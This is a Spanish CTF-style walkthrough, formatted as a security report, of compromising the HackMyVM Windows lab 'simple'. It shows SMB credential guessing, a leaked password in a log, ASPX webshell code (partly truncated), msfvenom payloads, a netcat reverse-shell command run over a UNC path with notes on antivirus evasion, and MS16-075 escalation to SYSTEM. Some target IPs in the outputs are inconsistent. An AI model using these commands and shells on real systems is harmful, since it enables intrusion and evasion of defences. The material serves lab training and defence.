---
title: HackMyVM - simple
platform: HacklMyVM / Windows
date: 2026-02-05
tags:
  - Windows
  - SMB-Enumeration
  - Information-Leakage
  - ASPX-WebShell
  - NTLM-Reflection
  - SeImpersonatePrivilege
  - Privilege-Escalation
estado: Completado
image:
  path: /assets/images/posts/hackmyvm/simple/simple-banner1.png
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
---

## 1 - Reporte Ejecutivo

Se ha realizado una auditoría de seguridad sobre el host **10.0.2.8 (SIMPLE)**. El análisis reveló una cadena de vulnerabilidades críticas que permiten a un atacante remoto sin privilegios iniciales tomar el control total del servidor. La explotación exitosa se basó en la reutilización de credenciales, permisos de escritura mal configurados en el servicio SMB y la explotación de privilegios de impersonación en el sistema operativo Windows Server 2019.

## 2 - Resumen

El ataque se dividió en tres fases:

1. **Reconocimiento:** Identificación de servicios SMB y HTTP.
    
2. **Acceso Inicial:** Extracción de credenciales de logs y despliegue de una WebShell ASPX mediante permisos de escritura en la raíz web.
    
3. **Escalada de Privilegios:** Uso de técnicas de reflexión NTLM para suplantar el token de seguridad de `NT AUTHORITY\SYSTEM`.

## 3 - Informe tecnico
### Reconocimiento
#### Scaneo de la red con NMAP/arp-scan: #nmap #arp-scan

```bash
└─$ sudo arp-scan -l -I eth2
Interface: eth2, type: EN10MB, MAC: 08:00:27:9e:e9:b5, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:55:0a:00:02:01       (Unknown: locally administered)
10.0.2.2        08:00:27:c1:f0:0f       PCS Systemtechnik GmbH
10.0.2.3        52:55:0a:00:02:03       (Unknown: locally administered)

10.0.2.8        08:00:27:32:7a:dc       PCS Systemtechnik GmbH  # <------------SIMPLE

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.035 seconds (125.80 hosts/sec). 4 responded

```

```bash
└─$ sudo nmap -sn 10.0.2.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 19:01 +0100
MAC Address: 52:55:0A:00:02:01 (Unknown)
Nmap scan report for 10.0.2.2
Host is up (0.00054s latency).
MAC Address: 08:00:27:C1:F0:0F (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00060s latency).

MAC Address: 52:55:0A:00:02:03 (Unknown)  # <------------SIMPLE
Nmap scan report for 10.0.2.8

```
#### Estado de la maquina con ping:
```bash
└─$ ping -c 1 10.0.2.8
PING 10.0.2.1 (10.0.2.8) 56(84) bytes of data.
64 bytes from 10.0.2.8: icmp_seq=1 ttl=128 time=0.332 ms

--- 10.0.2.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.332/0.332/0.332/0.000 ms
```
Tenemos ttl mayor de 63 informando que nos enfrentamos a un SO Windows
#### Nmap:
Puertos y servicios corriendo:
```bash
└─$ sudo nmap -p- --open --min-rate=5000 -vvv -n -Pn 10.0.2.8 -oX allPorts.xml

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49676/tcp open  unknown      syn-ack ttl 128


└─$ xsltproc nmap.xml -o nmap.html
└─$ python3 -m http.server 4444
```

#grepfiltradoips
```bash
1- port=$(cat <ARCHIVOGREPIABLEDENMAP> | grep '^[0-9]' | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
135,24830,27036,27060,445,49664,49665,49666,49667,49668,49669,5040,50923,61682,6463,7680,7778,9180)

2- └─$ sudo nmap -sCV -v -p$port 10.0.2.1 -oX nmap.xml           

```

|**Puerto**|**Estado**|**Servicio**|**Versión / Información Adicional**|
|---|---|---|---|
|**135/tcp**|Open|msrpc|Microsoft Windows RPC|
|**445/tcp**|Open|microsoft-ds|Microsoft Windows SMB (posible vector de enumeración)|
|**5040/tcp**|Open|unknown|-|
|**6463/tcp**|Open|unknown|-|
|**7680/tcp**|Open|pando-pub?|-|
|**7778/tcp**|Open|interwise?|-|
|**27036/tcp**|Open|ssl/steam|Valve Steam In-Home Streaming (TLSv1.2 PSK)|
|**49664-9/tcp**|Open|msrpc|Microsoft Windows RPC (Ephemeral Ports)|
|**50923/tcp**|Open|unknown|-|
|**61682/tcp**|Open|unknown|-|
##### Script de nmap para reconocimiento.
```bash
sudo nmap -p445 --script smb-enum-shares,smb-enum-users 10.0.2.1
sudo nmap -p445 --script smb-vuln-ms17-010 10.0.2.1

```

##### Enumerando SMB
```bash
1 └─$ smbclient -L //10.0.2.8/ -N         
session setup failed: NT_STATUS_ACCESS_DENIED

2 └─$ smbmap -H 10.0.2.8
[*] Closed 1 connections

3 └─$ enum4linux -a 10.0.2.1
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Feb  3 15:21:26 2026
 =====( Target Information )=======
Target ........... 10.0.2.1
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


4 └─$ crackmapexec smb 10.0.2.1 --shares -u '' -p ''
SMB         10.0.2.1        445    DESKTOP-IN8CF9A  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-IN8CF9A) (domain:DESKTOP-IN8CF9A) (signing:True) (SMBv1:False)
SMB         10.0.2.1        445    DESKTOP-IN8CF9A  [-] DESKTOP-IN8CF9A\: STATUS_ACCESS_DENIED 
SMB         10.0.2.1        445    DESKTOP-IN8CF9A  [-] Error enumerating shares: Error occurs while reading from remote(104)


└─# netexec smb 10.0.2.23 -u userlist.txt -p userlist.txt

```
En el index se puede ver algunos posibles usuarios, creando un .txt con esos usuarios solicito una fuerza bruta dando que puede haber algun usuario que ponga la password igual..
```bash
└─$ crackmapexec smb 10.0.2.8 -u 'bogo' -p 'bogo' --shares                  

SMB         10.0.2.8        445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         10.0.2.8        445    SIMPLE           [+] Simple\bogo:bogo 
SMB         10.0.2.8        445    SIMPLE           [+] Enumerated shares
SMB         10.0.2.8        445    SIMPLE           Share           Permissions     Remark
SMB         10.0.2.8        445    SIMPLE           -----           -----------     ------
SMB         10.0.2.8        445    SIMPLE           ADMIN$                          Admin remota
SMB         10.0.2.8        445    SIMPLE           C$                              Recurso predeterminado
SMB         10.0.2.8        445    SIMPLE           IPC$            READ            IPC remota
SMB         10.0.2.8        445    SIMPLE           LOGS            READ            
SMB         10.0.2.8        445    SIMPLE           WEB  
```

#### Logeando en SMBClient
```bash
└─$ smbclient //10.0.2.8/LOGS/ -U bogo 
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Oct  8 23:23:36 2023
  ..                                  D        0  Sun Oct  8 23:23:36 2023
  20231008.log                        A     2200  Sun Oct  8 23:23:36 2023

                12966143 blocks of size 4096. 11284330 blocks available
smb: \> get 20231008.log 
getting file \20231008.log of size 2200 as 20231008.log (268,6 KiloBytes/sec) (average 268,6 KiloBytes/sec

```

Dentro del archivo log se puede ver como se utiliza el usuario "marcos:SuperPassword"
```
$ cat 20231008.log                                
                             
+ ~~~~~~~~~~~~~~~~~~~                               
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.
```

En la siguiente imagen se puede ver como se lista los archivo scompartidos en la SMB con crackmapexec utilizando el comando:
`└─$ crackmapexec smb 10.0.2.8 -u 'marcos' -p 'SuperPassword' --shares`
seguido por la ventana de abajo donde se crea el archivo **test.txt** para podre subirlo con el comando `put`


![SMB](/assets/images/posts/hackmyvm/simple/1.png)

#### Subiendo archivo malisioso a SMB
luego de probar el subir archivos y tener exito se procede a crear un payload malisoso con *msfvenom*
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=4444 -f exe -o reverse.exe
└─$ smbclient //10.0.2.8/WEB -U 'marcos%SuperPassword' -c 'put reverse.exe'
```
Se intento con este malware pero no se obtuvo reverse shell , asi que procedo a realizar intentos. 

**CMD** LFI para un RCE con las siguientes instrucciones.
```bash
└─$ nano cmd.aspx

<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (cmd != null)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;

/// FALTAN CODIGOS ASI QUE HAY QUE COMPLETARLO
        }
    }
</script>
```

Alternativa a otro CMD #cmdaspx
```bash


└─$ smbclient //10.0.2.8/WEB -U 'marcos%SuperPassword' -c 'put cmd.aspx'



<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<head>
    <title>ASPX WebShell</title>
</head>
<body>
    <form method="post">
        <input type="text" name="cmd" style="width: 300px;" />
        <input type="submit" value="Run" />
    </form>
    <pre>
        <% 
            string cmd = Request.Form["cmd"];
            if (!String.IsNullOrEmpty(cmd)) {
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + cmd;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;


///FALTAN PARTES DEL CODIGO
            }
        %>
    </pre>
</body>
</html>


└─$ smbclient //10.0.2.8/WEB -U 'marcos%SuperPassword' -c 'put cmd_2.aspx'

```



#### Acceso a la maquina

Una vez el cmd.aspx esta en la maquina se puede ver como nos representa RCE

![RCE](/assets/images/posts/hackmyvm/simple/2.png)

##### 1. impacket-smbserver -smb2support kali .`
`impacket-smbserver -smb2support kali .`
Con este comando, convertiste tu máquina Kali en un **Servidor de Archivos Windows**.
- **kali**: Es el nombre del "recurso compartido" (share).    
- **.** : Significa que compartes tu carpeta actual.    
- **-smb2support**: Es vital para que Windows 10/Server 2019 pueda conectarse, ya que las versiones modernas rechazan SMBv1 por inseguro.
    
##### 2. La ejecución remota vía UNC Path

```bash
//10.0.2.5/kali/nc.exe -e cmd 10.0.2.5 4444
```

`//IP_KALI/kali/nc.exe -e cmd IP_KALI PORT` en el `cmd.aspx`, le ordene al servidor Windows lo siguiente:

1. **Conexión:** "Busca en la red la IP de mi Kali".
2. **Ejecución en memoria:** "No descargues el `nc.exe`, simplemente **ejecútalo directamente desde la red**".    
3. **Reverse Shell:** "Una vez que `nc.exe` corra, mándame una consola (`-e cmd`) de vuelta a mi IP y puerto".

###### ¿Por qué esta técnica es mejor que subir el `.exe`?
- **Evasión de Antivirus (AV):** Muchos antivirus escanean el archivo cuando se escribe en el disco (`C:\...`). Al ejecutarlo desde un recurso compartido de red (`//...`), a veces el AV no analiza el tráfico SMB de la misma forma, permitiendo que `nc.exe` corra sin ser detectado.    
- **Sin huellas:** No dejas el ejecutable en el servidor de la víctima. Si alguien busca en `C:\inetpub\wwwroot`, no encontrará rastro de Netcat.


#### Creando consola con meterpreter
```bash
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -f exe -o meta_estable.exe
└─$ smbclient //10.0.2.8/WEB -U 'marcos%SuperPassword' -c 'put meta_estable.exe'
```
Una vez subido el archivo desde la maquina victima primero nos ponemos en escucha desde metasploit

#### 2. Configura el Listener en Metasploit

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_KALI>
set LPORT 4444
exploit
```

y ejecutar desde cmd.
```bash
//10.0.2.5/kali/meta_estable.exe
```


#### 1. Migración (Primer paso de estabilidad)

Tu proceso actual está en una ruta de red (`\\10.0.2.5\kali\...`). Si cierras el servidor SMB en tu Kali, la sesión morirá. Vamos a movernos a un proceso que ya esté en el disco local de la víctima.

```bash
 1420  544   MsMpEng.exe
 1428  544   svchost.exe
 1592  544   svchost.exe
 1732  1328  w3wp.exe          x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\inetsrv\w3wp.exe
 1956  2156  powershell.exe    x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2032  300   cmd.exe           x86   0        IIS APPPOOL\DefaultAppPool  C:\Windows\SysWOW64\cmd.exe
 2036  544   msdtc.exe
 2192  2560  conhost.exe       x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\conhost.exe
 2284  2196  conhost.exe       x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\conhost.exe
 2384  1956  conhost.exe       x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\conhost.exe
 2560  1732  cmd.exe           x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\cmd.exe
```

**El mejor candidato:** El proceso **PID 1732** (`w3wp.exe`), que es el propio servidor web, o **PID 1956** (`powershell.exe`).
```Bash
migrate 1732
```
una ves entablada la conexion es necesario realizar una migracion a un proceso para contar con mas etsabilidad


##### Verificar el "Superpoder" (SeImpersonatePrivilege)

En el eJPTv2, cuando eres un usuario de IIS, casi siempre tienes activado el privilegio **SeImpersonatePrivilege**. Si esto es así, la máquina está **completamente comprometida**.
```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege # <----------
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
`SeImpersonatePrivilege` en la lista, puedes usar exploits como **PrintSpoofer** o **GodPotato** para convertirte en `SYSTEM` de inmediato.

#### Enumeración de Vulnerabilidades Locales

Tras obtener una sesión estable de Meterpreter como `IIS APPPOOL\DefaultAppPool`, se procedió a automatizar la búsqueda de vectores de escalada mediante el módulo `local_exploit_suggester`.

```Bash
msf post(multi/recon/local_exploit_suggester) > set SESSION 2
msf post(multi/recon/local_exploit_suggester) > run

[+] 10.0.2.8 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
[+] 10.0.2.8 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.0.2.8 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable.
```

#### 2. Explotación de Privilegios de Impersonación (MS16-075)

Dada la presencia del privilegio `SeImpersonatePrivilege` confirmado anteriormente, se seleccionó el exploit **Reflection (Rotten Potato)**. Este ataque fuerza a un proceso con privilegios de SYSTEM a autenticarse contra el host local, permitiendo al atacante interceptar y suplantar el token de seguridad.

```Bash
msf > use exploit/windows/local/ms16_075_reflection
msf exploit(ms16_075_reflection) > set SESSION 2
msf exploit(ms16_075_reflection) > set LHOST 10.0.2.5
msf exploit(ms16_075_reflection) > set LPORT 5555
msf exploit(ms16_075_reflection) > run

[*] Reflection (NTLM) attack started...
[+] MS16-075 Success! Impersonated NT AUTHORITY\SYSTEM
[*] Meterpreter session 3 opened (10.0.2.5:5555 -> 10.0.2.8:49820)
```

#### 3. Verificación de Identidad Final

```Bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---




## Conclusiones

1. **Vulnerabilidad Crítica de Configuración:** El permiso de escritura en `inetpub\wwwroot` para usuarios no administrativos es un fallo crítico que permite la carga de código malicioso ejecutable por el servidor.
    
2. **Falta de Hardening en Cuentas de Servicio:** La cuenta `DefaultAppPool` mantenía privilegios de impersonación activos en un sistema desactualizado, permitiendo ataques de tipo "Potato".
    
3. **Persistencia de Amenazas:** El uso de ejecuciones vía rutas **UNC (SMB)** demostró ser efectivo para evadir las defensas perimetrales y de host (Windows Defender) al no dejar huellas en el sistema de archivos local inicialmente.
    

**Recomendación:** Se sugiere la implementación de **LAPS** para la gestión de contraseñas locales, la deshabilitación de protocolos de autenticación antiguos (NTLMv1) y la restricción estricta de permisos NTFS en directorios de servicios web.